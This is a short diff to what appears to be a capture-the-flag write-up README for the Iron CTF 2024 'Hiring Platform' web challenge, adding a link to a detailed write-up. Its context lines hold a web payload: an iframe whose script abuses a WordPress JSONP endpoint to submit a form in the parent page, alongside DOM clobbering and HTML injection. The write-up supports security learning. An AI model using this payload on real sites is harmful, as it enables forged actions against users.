@@ -8,3 +8,5 @@ using dom clobbering to turn on production mode and using html injection to inje
 <iframe srcdoc="<script src='/blog/wp-json/wp/v2/users/1?_jsonp=window.parent.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.submit'>
 </script>"></iframe>
 ```
+
+Detailed Writeup: [Hiring Platform](https://abdulhaq.me/blog/iron-ctf-2024/#web-hiring-platform)
